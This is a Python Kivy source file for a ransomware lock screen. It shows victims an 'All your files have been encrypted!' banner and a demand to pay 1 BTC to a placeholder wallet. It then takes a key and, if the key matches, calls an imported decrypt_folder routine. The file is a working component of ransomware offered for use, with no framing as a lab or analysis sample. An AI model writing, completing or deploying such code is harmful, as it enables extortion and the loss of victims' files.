from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.textinput import TextInput
from decryptor import decrypt_folder

class LockScreen(BoxLayout):
    def __init__(self, correct_key, target_folder, **kwargs):
        super().__init__(orientation='vertical', **kwargs)
        self.correct_key = correct_key
        self.target_folder = target_folder

        self.add_widget(Label(text="💀 All your files have been encrypted!", font_size=24, color=(1, 0, 0, 1)))
        self.add_widget(Label(text="Pay 1 BTC to 0x123... and paste the decryption key below", font_size=16))

        self.entry = TextInput(multiline=False, password=True, font_size=18)
        self.add_widget(self.entry)

        self.status = Label(text="", font_size=14)
        self.add_widget(self.status)

        self.add_widget(Button(text="🔓 Decrypt Files", font_size=16, on_press=self.try_decrypt))

    def try_decrypt(self, instance):
        user_key = self.entry.text.encode()
        if user_key == self.correct_key:
            decrypt_folder(self.target_folder, user_key)
            self.status.text = "✅ Decryption successful."
        else:
            self.status.text = "❌ Wrong key. Try again."

class LockScreenApp(App):
    def __init__(self, correct_key, target_folder, **kwargs):
        self.correct_key = correct_key
        self.target_folder = target_folder
        super().__init__(**kwargs)

    def build(self):
        return LockScreen(self.correct_key, self.target_folder)
